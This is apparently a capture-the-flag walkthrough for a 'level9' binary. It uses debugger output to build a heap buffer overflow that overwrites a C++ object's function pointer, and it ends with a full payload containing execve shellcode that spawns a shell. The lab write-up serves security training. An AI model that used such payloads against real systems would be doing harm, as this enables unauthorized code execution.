In the [code](./source.cpp), we can observe that there is 2 instances of `N` with a call to `setAnnotation` with the input and that make an unprotected call to `memcpy`.
We will use a buffer overflow to replace the pointer of `func` in `b` to execute a shell code that will execute bash.

## Investigation

1) First, we will need to know where our instances are in the memory.
   ```shell
   $ ltrace ./level9 aaaa
   _Znwj(108, 0xbffff7e4, 0xbffff7f0, 0xb7d79e55, 0xb7fed280)                = 0x804a008
   _Znwj(108, 5, 0xbffff7f0, 0xb7d79e55, 0xb7fed280)                         = 0x804a078
   ```
   Our first instance is at `0x804a008`. We can observe the memory at this address
   ```shell
   (gdb) x/8xw 0x804a000
   0x804a000:      0x00000000      0x00000071      0x08048848      0x61616161
   0x804a010:      0x00000000      0x00000000      0x00000000      0x00000000
   ```
   We can see that our input is stored at `0x804a00c` and that there is a pointer at `0x804a008`. We can see where it points with
   ```shell
   (gdb) x/x 0x08048848
   0x8048848 <_ZTV1N+8>:   0x0804873a
   ```
   With the code on the side we could imagine that `0x0804873a` is the default value of `func` with a pointer to the `operator+` of `N`.
   We can verify that with
   ```shell
   (gdb) i fun N
   ...
   0x0804873a  N::operator+(N&)
   ...
   ```

2) Then, we will need the offset before writing in `func` of `b`. As seen in 1), we know that `func` is stored at the first byte of the instance, and that the instance of `b` is at `0x804a078`.
   We can then calculate the difference between our input and the target with `0x804a078 - 0x804a00c = 0x6c = 0d108`.

3) Finaly, we need to be aware that `func` need to be a pointer. So the value of our input need to be a pointer to our shell code.
   We will target the next byte after our input `0x804a00c + 4 = 0x804a010`.

## Exploit

We will use the same shell code used in [level2](../level2/walkthrough.md).

Our payload will look like this
```
<pointer to shell code> + <shell code> + "a"*<offset> + <address of input>
```
Completed it will be
```
"\x10\xa0\x04\x08" + "\x6a\x0b\x58\x99\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\xcd\x80" + "a" * 83 + "\x0c\xa0\04\x08"
```

```shell
./level9 $(python -c 'print "\x10\xa0\x04\x08" + "\x6a\x0b\x58\x99\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\xcd\x80" + "a" * 83 + "\x0c\xa0\04\x08"')
```
